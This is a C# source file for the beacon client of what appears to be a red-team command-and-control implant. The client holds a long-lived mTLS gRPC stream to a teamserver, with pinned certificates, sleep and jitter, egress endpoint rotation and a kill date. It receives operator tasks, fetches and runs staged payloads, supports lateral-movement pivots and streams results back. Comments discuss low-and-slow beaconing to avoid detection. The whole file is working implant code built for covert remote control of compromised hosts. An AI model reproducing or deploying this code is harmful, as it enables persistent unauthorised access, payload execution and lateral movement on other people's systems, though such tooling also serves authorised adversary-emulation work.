using System.Collections.Concurrent;
using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Grpc.Core;
using Grpc.Net.Client;
using Rod.V1;
// The generated gRPC client lives in Rod.V1.Beacon (a static client factory
// class with the nested BeaconClient). This class is also named Beacon, so alias
// the generated one to avoid the name clash.
using WireBeacon = Rod.V1.Beacon;

namespace Rod.Implant.Internal;

// The reference implant's mTLS contact client: it opens the long-lived reverse
// Beacon.Contact stream, completes the handshake, and then loops reading
// downstream tasking and writing upstream results (architecture.md Sec 5/8,
// Sec 10.3). The stream is bidirectional frames whose payloads are the rod.v1
// handshake/task/result messages.

/// <summary>
/// Runs the implant's contact lifecycle against the teamserver: dial the mTLS
/// endpoint, complete the handshake, then loop dispatching downstream tasks and
/// reporting upstream results. Blocks until the cancellation token fires or the
/// baked-in kill date passes. The cadence follows the baked-in sleep + jitter
/// profile.
/// </summary>
internal sealed class Beacon : IContactClient
{
    // How one contact cycle uses the stream. Stream holds the connection open
    // for the life of the session -- the interactive shape, server-push
    // tasking with no reconnect cost. Poll drains queued tasking, closes the
    // stream, and sleeps the beacon interval: the low-and-slow shape, where a
    // persistent connection would be the loudest signal an implant emits.
    // Both ride the same stream contract; only the client's use of it differs.
    private readonly string _mode;
    private readonly EgressEndpoints _egress;
    private readonly string _implantId;
    private readonly X509Certificate2 _leaf;
    private readonly ECDsa _privateKey;
    private readonly IReadOnlyList<X509Certificate2> _cas;
    private readonly TimeSpan _sleep;
    private readonly TimeSpan _jitter;
    private readonly DateTimeOffset? _killDate;
    private readonly HandlerRegistry _handlers;
    private readonly IReadOnlyList<string> _classVerbs;
    private readonly TextWriter _log;

    // The live cadence (runtime-retunable through beacon.sleep); null keeps
    // the baked sleep/jitter pair, the pre-cadence shape tests construct.
    private readonly Cadence? _cadence;

    // The fronted-pivot ledger (architecture.md Sec 5.2): the Pivot children
    // this implant enrolled, whose tasking this stream executes. Null when
    // derivation is disabled (no enroll bundle) -- nothing is fronted then.
    private readonly FrontedPivots? _fronted;

    // The replay-nonce state (architecture.md Sec 9 -- tasking replay nonces):
    // the accepted-nonce floor spans the implant's whole run, so a captured
    // frame replayed after a reconnect still falls at or below it. Shared
    // with the envelope client when both cover one run.
    private readonly TaskNonceTracker _nonces;

    // The held-task ledger (architecture.md Sec 10.3 -- the dispatch strand):
    // the dedup and result cache behind the receive-ack arm, shared by every
    // contact client covering one run the same way the nonce floor is.
    private readonly HeldTaskLedger _held;

    // The shared task-acceptance pipeline (fronting gate, verification,
    // dedup, staged/channel/inline shapes) over this client's per-run state.
    private readonly BeaconTasking _tasking;

    /// <summary>
    /// Builds a Beacon whose handler registry carries no enroll bundle, so the
    /// lateral.move handler reports derivation as unavailable.
    /// </summary>
    public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
        IReadOnlyList<string> classVerbs, TextWriter log)
        : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll: null, classVerbs, log)
    {
    }

    /// <summary>
    /// Builds a Beacon with an explicit contact mode ("stream" or "poll"; the
    /// baked profile or the -mode flag decides). See the field comment for what
    /// each mode trades.
    /// </summary>
    public Beacon(string mode, EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
        EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log,
        TaskNonceTracker? nonces = null, Cadence? cadence = null, HeldTaskLedger? held = null)
        : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll, classVerbs, log, nonces, cadence, held)
    {
        _mode = mode;
        // The poll run's store-and-forward channel carriage: channels batch
        // their output and final results into the upstream this object owns,
        // flushed at each cycle's start, input arriving on later cycles --
        // the same discipline every poll-mode client runs (PollChannels).
        if (mode == BeaconModes.Poll)
            _poll = new PollChannels(_held, log);
    }

    /// <summary>
    /// Builds a Beacon whose lateral.move handler can derive a child using
    /// <paramref name="enroll"/> (architecture.md Sec 10.1). A null bundle leaves
    /// derivation disabled. <paramref name="classVerbs"/> is the baked verb set;
    /// the advertised capability set derives from it (Sec 5.3).
    /// <paramref name="egress"/> is the baked endpoint walk (Sec 8): the cycle
    /// dials the current entry and a failed cycle advances to the next.
    /// <paramref name="nonces"/> shares the replay-nonce floor with another
    /// contact client covering the same run (the envelope client); null keeps
    /// this beacon's own tracker. <paramref name="cadence"/> is the live
    /// contact cadence beacon.sleep retunes; null keeps the baked pair.
    /// <paramref name="held"/> shares the held-task ledger the same way.
    /// </summary>
    public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
        EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log,
        TaskNonceTracker? nonces = null, Cadence? cadence = null, HeldTaskLedger? held = null)
    {
        _mode = BeaconModes.Stream;
        _egress = egress;
        _implantId = implantId;
        _leaf = leaf;
        _privateKey = privateKey;
        _cas = cas;
        _sleep = sleep;
        _jitter = jitter;
        _killDate = killDate;
        // The registry carries the reference set plus whatever out-of-tree
        // handlers the build unit baked through ExtensionRegistrations (the
        // extension kit's additional seam, extending/tradecraft.md): empty in
        // the dev stub, generated per build when an extension directory is
        // configured. The cadence rides in so beacon.sleep retunes this run.
        _handlers = HandlerRegistry.Default(enroll, cadence, ExtensionRegistrations.Handlers);
        _cadence = cadence;
        // The same bundle's fronted ledger (Sec 5.2): the lateral.move handler
        // records each Pivot child into it, and the tasking loop above gates
        // fronted tasking on it -- one instance, shared by derivation and
        // fronting.
        _fronted = enroll?.Fronted;
        _classVerbs = classVerbs;
        _log = log;
        _nonces = nonces ?? new TaskNonceTracker();
        _held = held ?? new HeldTaskLedger();
        _tasking = new BeaconTasking(_implantId, _cas, _fronted, _nonces, _held, _handlers, _log);
    }

    // The poll run's channel carriage; null on a stream run, whose channels
    // live on the connection itself.
    private readonly PollChannels? _poll;

    /// <summary>
    /// This client carries the bare host:port URL shape (architecture.md
    /// Sec 8): the mTLS socket the gRPC stream dials. A schemed beacon URL
    /// belongs to another client -- http(s) to the envelope POST cycle or the
    /// WebSocket beacon, quic to the QUIC stream, dns/doh to the DNS carrier,
    /// tcp/smb to the socket contact -- so the predicate excludes every
    /// schemed shape rather than relying on the coordinator's ordering (the
    /// same disjointness the build-side module registry gives its
    /// bare-authority fallthrough).
    /// </summary>
    public bool Serves(string beaconUrl)
        => !BeaconUrl.IsWeb(beaconUrl)
           && !BeaconUrl.IsQuic(beaconUrl)
           && !BeaconUrl.IsDns(beaconUrl)
           && !BeaconUrl.IsSocket(beaconUrl);

    /// <summary>
    /// Blocks until cancellation or the kill date passing. Reconnects after a
    /// jittered sleep when the stream drops (implants are connection initiators;
    /// flapping is expected and handled by reconnecting, architecture.md Sec 8),
    /// backing off exponentially over consecutive failures so a down teamserver
    /// is not hammered at beacon rate. The kill date is checked at the top of
    /// each cycle so a long-running implant self-terminates once it passes, not
    /// only on the next restart (architecture.md Sec 7). Returns
    /// <see cref="ContactExit.SwitchTransport"/> when the walk's current entry
    /// is a web URL, so the coordinator hands the run to the envelope client.
    /// </summary>
    public async Task<ContactExit> RunAsync(CancellationToken cancellationToken)
    {
        try
        {
            return await RunCyclesAsync(cancellationToken);
        }
        finally
        {
            // The run is ending: the poll carriage's channels end with it --
            // the token releases the handlers, and the delivery waits keep
            // the last upstream writes accounted before the coordinator
            // moves on.
            if (_poll is not null)
                await _poll.DisposeAsync();
        }
    }

    private async Task<ContactExit> RunCyclesAsync(CancellationToken cancellationToken)
    {
        var consecutiveFailures = 0;
        while (!cancellationToken.IsCancellationRequested)
        {
            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
            {
                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                return ContactExit.Terminate;
            }
            // The transport selection follows the egress walk's URL shape: a
            // web entry (http(s)://) is the envelope POST client's -- yield so
            // the coordinator hands the run over. Re-checked every cycle, so a
            // walk that crosses shapes re-routes at the next entry.
            if (BeaconUrl.IsWeb(_egress.CurrentBeaconUrl))
                return ContactExit.SwitchTransport;
            var cycle = BeaconCycleResult.Dropped;
            try
            {
                cycle = await RunOnceAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (RpcException ex)
            {
                _log.WriteLine($"beacon stream ended: {ex.Status.Detail}");
                // The stream died mid-flight: results written on it may never
                // have been read, so their delivery marks clear and the next
                // connection re-sends them (first-wins server-side).
                _held.InvalidateDeliveries();
            }
            catch (Exception ex)
            {
                _log.WriteLine($"beacon stream ended: {ex.Message}");
                _held.InvalidateDeliveries();
            }

            // A handshake refusal is permanent for this artifact (retired, kill
            // date expired, unknown implant -- none of them change on a retry),
            // so the loop ends there instead of reconnecting forever.
            if (cycle == BeaconCycleResult.Terminal)
                return ContactExit.Terminate;

            if (cycle == BeaconCycleResult.Handshaken)
            {
                consecutiveFailures = 0;
            }
            else
            {
                consecutiveFailures++;
                // The egress walk (architecture.md Sec 8): a cycle that never
                // reached a handshake means the current front is not answering,
                // so the next attempt dials the next entry. The walk wraps to the
                // primary, keeping the whole list in rotation; a cycle that
                // handshook keeps the entry that answered.
                var from = _egress.CurrentBeaconUrl;
                _egress.Advance();
                if (from != _egress.CurrentBeaconUrl)
                    _log.WriteLine($"beacon endpoint {from} failed; walking to {_egress.CurrentBeaconUrl}");
            }
            try
            {
                // The cadence is read fresh every cycle, so a beacon.sleep
                // change lands on the very next sleep.
                var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
                await ContactCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return ContactExit.Terminate;
            }
        }
        return ContactExit.Terminate;
    }

    // One connect-handshake-task cycle. Returns how the cycle ended so the
    // caller can distinguish a transport drop (retry) from a handshake refusal
    // (permanent). Throws on transport errors, which the caller logs and
    // retries.
    private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
    {
        using var handler = new SocketsHttpHandler();
        var pinned = new X509Certificate2Collection();
        foreach (var ca in _cas)
            pinned.Add(ca);
        handler.SslOptions = new SslClientAuthenticationOptions
        {
            ClientCertificates = new X509Certificate2Collection(_leaf),
            RemoteCertificateValidationCallback = (_, cert, chain, errors) =>
                C2.PinServerChain(cert as X509Certificate2, chain, pinned),
        };

        // grpc-dotnet takes the channel address; HTTPS transport security comes
        // from the SocketsHttpHandler's SslOptions. The beacon URL may be passed
        // as "host:port" (no scheme); prepend https:// so the channel builder
        // accepts it.
        var address = GrpcAddress(_egress.CurrentBeaconUrl);
        using var channel = GrpcChannel.ForAddress(address, new GrpcChannelOptions
        {
            HttpHandler = handler,
        });

        var client = new WireBeacon.BeaconClient(channel);
        using var call = client.Contact(cancellationToken: cancellationToken);

        // The implant speaks first: handshake with its protocol version and
        // identity. The advertised capability set is the baked class verbs
        // intersected with the compiled handlers (architecture.md Sec 5.3),
        // and both negotiation arms ride it (Sec 9, Sec 10.3).
        var handshake = BeaconFrames.Handshake(_implantId, _handlers.AdvertisedVerbs(_classVerbs), _cadence);
        // The poll run's channel carriage rides the advertisement: the
        // server's parking hub reads it off the session and parks operator
        // input for the cycles to carry.
        if (_poll is not null)
            handshake.Capabilities.Add(PollChannels.Capability);
        await call.RequestStream.WriteAsync(new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) });

        if (!await call.ResponseStream.MoveNext(cancellationToken))
            throw new RpcException(new Status(StatusCode.Unavailable, "handshake: stream closed"));
        var hs = HandshakeResponse.Parser.ParseFrom(call.ResponseStream.Current.Payload);
        if (hs.Status != HandshakeStatus.Ok)
        {
            // Every non-OK handshake status (unknown implant, kill date expired,
            // retired, identity/version mismatch) is permanent for this artifact:
            // retrying would not change the answer, so terminate instead of
            // reconnecting forever.
            _log.WriteLine($"handshake refused: {hs.Status}; terminating");
            return BeaconCycleResult.Terminal;
        }
        _nonces.Negotiated = hs.ReplayNonces;
        // The receive-ack arm (architecture.md Sec 10.3): negotiated per
        // connection, so read it here rather than tracking it on shared state.
        // A server that does not echo keeps today's dispatch semantics -- and
        // the dedup ledger still guards, because a redelivery can arrive from
        // a carrier that did negotiate.
        var acks = hs.TaskAcks;
        _log.WriteLine($"handshake ok: engagement={hs.EngagementId}, replay-nonces={hs.ReplayNonces}");

        // Tasking loop: read TaskRequest downstream, dispatch, write TaskResult
        // up. Stream mode blocks until the server closes; poll mode drains the
        // queue and ends the cycle on a short idle window (below), so the
        // implant can sleep the beacon interval instead of holding a line open.
        // A staged task (the typed arm, architecture.md Sec 10) is demanded and
        // reassembled before its handler runs -- the bulk payload arrives as a
        // chunk run, never inside the arguments string.
        //
        // The streaming task shape (architecture.md Sec 10.3) runs alongside:
        // a write gate serializes this loop and every live channel's pumps --
        // the gRPC stream allows one outstanding write -- and the live
        // channels, keyed by task id, take the ChannelInput frames the loop
        // routes to them. Both die with the stream: the finally cancels every
        // channel and waits out its pumps.
        var writeGate = new SemaphoreSlim(1, 1);
        var liveChannels = new ConcurrentDictionary<string, BeaconLiveChannel>();
        using var channelsGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        async Task Write(Frame frame, CancellationToken ct) => await WriteFrameAsync(call, writeGate, frame, ct);

        // The poll run's store-and-forward batch rides first: every frame the
        // channels queued while disconnected (output, final results) crosses
        // on this cycle, delivered only when the writes did. Ahead of the
        // held replay on purpose -- the batch carries a channel's output
        // frames ahead of its final TaskResult, and a replayed result
        // landing first would complete the task before the transcript
        // frames that belong ahead of it.
        List<Frame>? pollPending = null;
        if (_poll is not null)
        {
            pollPending = _poll.SnapshotPending();
            foreach (var frame in pollPending)
                await Write(frame, cancellationToken);
        }

        // Results whose delivery died with an earlier stream ride this one
        // next (architecture.md Sec 10.3 -- the dispatch strand); the server
        // records first-wins, so a re-send of a result the original stream
        // already landed is absorbed, and one it lost is recovered.
        await _tasking.ReplayUndeliveredAsync(Write, cancellationToken);

        try
        {
            while (await MoveNextFrameAsync(call.ResponseStream, cancellationToken))
            {
                var frame = call.ResponseStream.Current;

                // ChannelInput is the only kind-bearing downstream frame:
                // operator input for a live channel, routed by task id. A
                // kindless frame is the positional grammar -- a TaskRequest,
                // or a staged chunk run this implant demanded.
                if (frame.Kind == FrameKind.ChannelInput)
                {
                    if (_poll is not null)
                        _poll.RouteInput(frame);
                    else
                        BeaconFrames.RouteChannelInput(frame, liveChannels, _log);
                    continue;
                }

                var task = TaskRequest.Parser.ParseFrom(frame.Payload);

                // The dispatch strand's ack half (architecture.md Sec 10.3):
                // delivery evidence for the parsed frame, sent before anything
                // runs -- including a task the acceptance below will refuse,
                // because a refused task is still a delivered one.
                if (acks)
                    await Write(BeaconFrames.AckFrame(task.TaskId), cancellationToken);

                await _tasking.AcceptAsync(
                    task,
                    Write,
                    (staged, ct) => RunStagedTaskAsync(call, writeGate, staged, ct),
                    _poll is not null
                        ? (started, handler) => _poll.StartChannel(started, handler)
                        : (started, handler) => StartChannel(call, writeGate, liveChannels, started, handler, channelsGone.Token),
                    cancellationToken);
            }

            // The batch crossed with the cycle's writes: clear exactly what
            // was flushed. A cycle that died mid-write keeps its frames for
            // the next one.
            if (_poll is not null && pollPending is not null)
                _poll.MarkDelivered(pollPending);

            // Poll mode: the queue is drained and the idle window closed the read
            // loop -- half-close the send side and wait for the server to end the
            // stream, so every result written above is fully delivered before the
            // cycle ends and the beacon sleeps.
            if (IsPoll)
            {
                try
                {
                    await call.RequestStream.CompleteAsync();
                    while (await call.ResponseStream.MoveNext(cancellationToken))
                    {
                        // Nothing further is expected; drain until the server ends.
                    }
                }
                catch (RpcException)
                {
                    // The server tore the stream down as it processed the
                    // half-close; the results are already upstream.
                }
            }
        }
        finally
        {
            // The stream is ending: the channels are session-scoped, so they
            // end with it. The token releases the handlers (their processes
            // are killed and their pumps unwind), and the delivery waits keep
            // the call alive until every pump's last write has left the gate.
            channelsGone.Cancel();
            foreach (var live in liveChannels.Values)
                live.CompleteInput();
            await Task.WhenAll(liveChannels.Values.Select(c => c.Delivery));
        }

        return BeaconCycleResult.Handshaken;
    }

    // gRPC streams allow one outstanding write at a time; the dispatch loop
    // and every live channel's output pumps share this stream, so all of them
    // write through this gate. The token bounds the wait, not the write -- an
    // in-flight write cancels with the call itself.
    private static async ValueTask WriteFrameAsync(
        AsyncDuplexStreamingCall<Frame, Frame> call,
        SemaphoreSlim writeGate,
        Frame frame,
        CancellationToken cancellationToken)
    {
        await writeGate.WaitAsync(cancellationToken);
        try
        {
            await call.RequestStream.WriteAsync(frame);
        }
        finally
        {
            writeGate.Release();
        }
    }

    // Opens a channel for a dispatched streaming task and starts its handler
    // in the background: the loop returns to reading immediately, the channel
    // takes its input frames as they arrive, and the delivery task reports
    // the handler's outcome as the task's final TaskResult.
    private void StartChannel(
        AsyncDuplexStreamingCall<Frame, Frame> call,
        SemaphoreSlim writeGate,
        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels,
        TaskRequest task,
        CapabilityChannelHandler handler,
        CancellationToken lifetime)
    {
        var channel = new BeaconLiveChannel(
            task.TaskId,
            (frame, ct) => WriteFrameAsync(call, writeGate, frame, ct));
        liveChannels[task.TaskId] = channel;
        _log.WriteLine($"channel opened: task {task.TaskId} verb {task.Verb}");
        channel.Delivery = DeliverChannelAsync(call, writeGate, liveChannels, channel, task, handler, lifetime);
    }

    // The channel's delivery: run the handler to its end, then write its
    // outcome. A channel whose stream dies under it ends silently -- there is
    // no operator left to tell, and the server-side task stays dispatched,
    // the documented session-scoped lifetime.
    private async Task DeliverChannelAsync(
        AsyncDuplexStreamingCall<Frame, Frame> call,
        SemaphoreSlim writeGate,
        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels,
        BeaconLiveChannel channel,
        TaskRequest task,
        CapabilityChannelHandler handler,
        CancellationToken lifetime)
    {
        try
        {
            var (outcome, output) = await handler.Handle(task.Arguments, channel, lifetime);
            await WriteFrameAsync(call, writeGate, BeaconFrames.ResultFrame(task, outcome, output), CancellationToken.None);
            _held.Remember(task.TaskId, outcome, output);
            _held.MarkDelivered(task.TaskId);
            _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
        }
        catch (Exception ex)
        {
            _log.WriteLine($"channel ended without delivery: task {task.TaskId}: {ex.Message}");
        }
        finally
        {
            liveChannels.TryRemove(task.TaskId, out _);
            channel.CompleteInput();
        }
    }

    // One live task channel on this stream: the input queue the loop routes
    // ChannelInput frames into, the write binding that streams output chunks
    // upstream through the stream's write gate, and the delivery task that
    // reports the handler's final TaskResult. Implements IChannelStream, so
    // the handler never touches the transport (architecture.md Sec 10.3) --
    // the shared BeaconLiveChannel, extracted so the WebSocket stream client
    // binds the same shape to its own writer.

    // How long a poll-mode read waits for the next downstream frame before
    // deciding the queue is drained. The server pushes tasking the moment it
    // is queued, so the window only needs to outlast that push; a close that
    // races a dispatch is still safe -- an unclaimed task stays queued, and a
    // task whose frame write failed is requeued server-side. Staged transfers
    // never see this window: they read on the longer deadline below.
    private static readonly TimeSpan PollIdleWindow = TimeSpan.FromMilliseconds(250);

    // How long a staged read waits for the next chunk before giving up on the
    // transfer. An active transfer is the implant's own request in flight --
    // unlike the idle window this must not cut a run in half, so it is a
    // timeout, not a cadence: a server that cannot produce the next chunk
    // within it has failed the transfer.
    private static readonly TimeSpan StagedChunkTimeout = TimeSpan.FromSeconds(30);

    // Runs one staged task (architecture.md Sec 10, the typed arm): demand the
    // payload, reassemble the chunk run the server answers with, then dispatch
    // the verb's staged handler. A transfer that ends early (stream dropped,
    // timeout, terminal chunk never arrived) is reported Failed on the task
    // itself -- the operator sees the cause where they look for the outcome.
    private async Task<(TaskOutcome Outcome, string Output)> RunStagedTaskAsync(
        AsyncDuplexStreamingCall<Frame, Frame> call,
        SemaphoreSlim writeGate,
        TaskRequest task,
        CancellationToken cancellationToken)
    {
        await WriteFrameAsync(call, writeGate, new Frame
        {
            Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
            Kind = FrameKind.StagedPull,
        }, cancellationToken);

        var parts = new List<byte[]>();
        var total = 0;
        while (true)
        {
            if (!await MoveNextStagedAsync(call.ResponseStream, cancellationToken))
            {
                _log.WriteLine($"task {task.TaskId}: staged stream ended before the terminal chunk");
                return (TaskOutcome.Failed, "staged payload stream ended before the terminal chunk");
            }

            StagedChunk chunk;
            try
            {
                chunk = StagedChunk.Parser.ParseFrom(call.ResponseStream.Current.Payload);
            }
            catch (Google.Protobuf.InvalidProtocolBufferException)
            {
                return (TaskOutcome.Failed, "staged payload contained a malformed chunk");
            }
            if (chunk.TaskId != task.TaskId)
                return (TaskOutcome.Failed, "staged payload chunk carried a foreign task id");

            var data = chunk.Data.ToArray();
            parts.Add(data);
            total += data.Length;
            if (chunk.Terminal)
                break;
        }

        var payload = new byte[total];
        var offset = 0;
        foreach (var part in parts)
        {
            part.CopyTo(payload, offset);
            offset += part.Length;
        }
        return _handlers.DispatchStaged(task.Verb, task.Arguments, payload);
    }

    // One read of a staged chunk run: stream mode blocks on the token, poll
    // mode reads on the transfer timeout instead of the idle window so an
    // in-flight run is not mistaken for a drained queue.
    private async Task<bool> MoveNextStagedAsync(Grpc.Core.IAsyncStreamReader<Frame> stream, CancellationToken cancellationToken)
    {
        if (!IsPoll)
            return await stream.MoveNext(cancellationToken);

        using var deadline = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        deadline.CancelAfter(StagedChunkTimeout);
        try
        {
            return await stream.MoveNext(deadline.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            return false;
        }
        catch (RpcException) when (deadline.IsCancellationRequested && !cancellationToken.IsCancellationRequested)
        {
            return false;
        }
    }

    private bool IsPoll => _mode == BeaconModes.Poll;

    // One read of the downstream stream: stream mode blocks on the token, poll
    // mode adds the idle window whose expiry ends the cycle.
    private async Task<bool> MoveNextFrameAsync(Grpc.Core.IAsyncStreamReader<Frame> stream, CancellationToken cancellationToken)
    {
        if (!IsPoll)
            return await stream.MoveNext(cancellationToken);

        using var idle = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        idle.CancelAfter(PollIdleWindow);
        try
        {
            return await stream.MoveNext(idle.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            return false;
        }
        catch (RpcException) when (idle.IsCancellationRequested && !cancellationToken.IsCancellationRequested)
        {
            return false;
        }
    }

    // Normalizes the beacon URL into the form GrpcChannel.ForAddress expects: a
    // scheme is required, so "host:port" becomes "https://host:port" -- the mTLS
    // beacon a schemeless name means. An explicit http:// is honored as the
    // plaintext h2c beacon the teamserver's loopback dev listener serves (no
    // TLS, identity by handshake id alone; TransportHost's plain-HTTP bind).
    // Any trailing path is dropped -- gRPC uses the :authority, not a path.
    private static string GrpcAddress(string beaconUrl)
    {
        var u = beaconUrl.Trim();
        if (u.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
        {
            u = u["https://".Length..];
            var slash = u.IndexOf('/');
            if (slash >= 0)
                u = u[..slash];
            return $"https://{u}";
        }
        if (u.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
        {
            u = u["http://".Length..];
            var slash = u.IndexOf('/');
            if (slash >= 0)
                u = u[..slash];
            return $"http://{u}";
        }
        var bare = u.IndexOf('/');
        if (bare >= 0)
            u = u[..bare];
        return $"https://{u}";
    }
}
